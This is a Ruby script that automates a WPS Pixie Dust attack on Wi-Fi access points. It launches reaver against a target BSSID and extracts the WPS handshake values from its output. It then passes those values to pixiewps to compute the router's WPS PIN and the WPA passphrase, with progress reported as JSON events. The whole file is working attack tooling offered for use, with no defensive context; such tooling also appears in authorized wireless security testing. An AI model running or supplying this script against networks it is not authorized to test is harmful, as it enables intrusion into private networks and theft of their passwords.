#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

def parse_reaver_output(line, bssid, iface)
  data = { line: line.strip }

  case line
  when /\[\+\]\s*PKE\s*:\s*([a-fA-F0-9]+)/
    emit('pixie_pke', iface, bssid, '', 0, data.merge(pke: $1))
  when /\[\+\]\s*PKR\s*:\s*([a-fA-F0-9]+)/
    emit('pixie_pkr', iface, bssid, '', 0, data.merge(pkr: $1))
  when /\[\+\]\s*E-Hash1\s*:\s*([a-fA-F0-9]+)/
    emit('pixie_ehash1', iface, bssid, '', 0, data.merge(ehash1: $1))
  when /\[\+\]\s*E-Hash2\s*:\s*([a-fA-F0-9]+)/
    emit('pixie_ehash2', iface, bssid, '', 0, data.merge(ehash2: $1))
  when /\[\+\]\s*AuthKey\s*:\s*([a-fA-F0-9]+)/
    emit('pixie_authkey', iface, bssid, '', 0, data.merge(authkey: $1))
  when /\[\+\]\s*ENonce\s*:\s*([a-fA-F0-9]+)/
    emit('pixie_enonce', iface, bssid, '', 0, data.merge(enonce: $1))
  when /WPS\s+lockout/i
    emit('wps_lockout', iface, bssid, '', 0, data)
  when /\[\+\]\s*Found\s*Pin\s*:\s*(\d{4,8})/
    emit('pixie_pin_found', iface, bssid, '', 0, data.merge(pin: $1))
  when /\[\+\]\s*WPA\s*PSK\s*:\s*(.+)/
    emit('pixie_psk_found', iface, bssid, '', 0, data.merge(psk: $1.strip))
  end
end

def run_pixiewps(bssid, iface)
  reaver = `which reaver 2>/dev/null`.strip
  pixiewps = `which pixiewps 2>/dev/null`.strip

  emit('pixie_info', iface, bssid, '', 0, { reaver: !reaver.empty?, pixiewps: !pixiewps.empty? })

  raise 'reaver not found in PATH' if reaver.empty?

  pke_val = nil
  pkr_val = nil
  ehash1_val = nil
  ehash2_val = nil
  authkey_val = nil
  enonce_val = nil

  emit('pixie_reaver_start', iface, bssid, '', 0, { command: "#{reaver} -i #{iface} -b #{bssid} -K 1 -vv" })

  Open3.popen3(reaver, '-i', iface, '-b', bssid, '-K', '1', '-vv') do |stdin, stdout, stderr, reaver_thread|
    stdin.close
    readers = [stdout, stderr]

    until readers.empty?
      ready = IO.select(readers, nil, nil, 0.5)
      if ready
        ready[0].each do |r|
          begin
            line = r.gets
            if line
              line.force_encoding('UTF-8')
              parse_reaver_output(line, bssid, iface)

              pke_val = $1 if line =~ /\[\+\]\s*PKE\s*:\s*([a-fA-F0-9]+)/
              pkr_val = $1 if line =~ /\[\+\]\s*PKR\s*:\s*([a-fA-F0-9]+)/
              ehash1_val = $1 if line =~ /\[\+\]\s*E-Hash1\s*:\s*([a-fA-F0-9]+)/
              ehash2_val = $1 if line =~ /\[\+\]\s*E-Hash2\s*:\s*([a-fA-F0-9]+)/
              authkey_val = $1 if line =~ /\[\+\]\s*AuthKey\s*:\s*([a-fA-F0-9]+)/
              enonce_val = $1 if line =~ /\[\+\]\s*ENonce\s*:\s*([a-fA-F0-9]+)/
            else
              readers.delete(r)
            end
          rescue Errno::EINTR
            next
          end
        end
      end
    end

    reaver_thread.join
  end

  if pixiewps.empty?
    emit('pixiewps_not_found', iface, bssid, '', 0, {})
    return
  end

  return unless pke_val && pkr_val && ehash1_val && ehash2_val

  emit('pixiewps_start', iface, bssid, '', 0, { command: "#{pixiewps} --pke #{pke_val} --pkr #{pkr_val} --e-hash1 #{ehash1_val} --e-hash2 #{ehash2_val}" })

  pixie_args = [pixiewps, '--pke', pke_val, '--pkr', pkr_val,
                '--e-hash1', ehash1_val, '--e-hash2', ehash2_val]
  pixie_args += ['--authkey', authkey_val] if authkey_val
  pixie_args += ['--e-nonce', enonce_val] if enonce_val

  Open3.popen3(*pixie_args) do |stdin, stdout, stderr, pixie_thread|
    stdin.close
    [stdout, stderr].each do |r|
      Thread.new do
        r.each_line do |line|
          line.force_encoding('UTF-8')
          emit('pixiewps_output', iface, bssid, '', 0, { line: line.strip })
          if line =~ /\[\+\]\s*Pin\s*:\s*(\d{4,8})/
            emit('pixie_pin_computed', iface, bssid, '', 0, { pin: $1, tool: 'pixiewps' })
          end
          if line =~ /\[\+\]\s*WPA\s*PSK\s*:\s*(.+)/
            emit('pixie_psk_computed', iface, bssid, '', 0, { psk: $1.strip, tool: 'pixiewps' })
          end
        end
      end
    end
    pixie_thread.join
  end
end

begin
  bssid = ARGV[0]
  iface = ARGV[1]
  output_dir = ARGV[2] || '.'

  raise 'usage: wps_pixie.rb <bssid> <interface> [output_dir]' unless bssid && iface

  Dir.mkdir(output_dir) unless Dir.exist?(output_dir)

  emit('pixie_start', iface, bssid, '', 0, { output_dir: output_dir })
  run_pixiewps(bssid, iface)
  emit('pixie_complete', iface, bssid, '', 0, {})

rescue Interrupt
  emit('pixie_interrupted', iface || '', bssid || '', '', 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
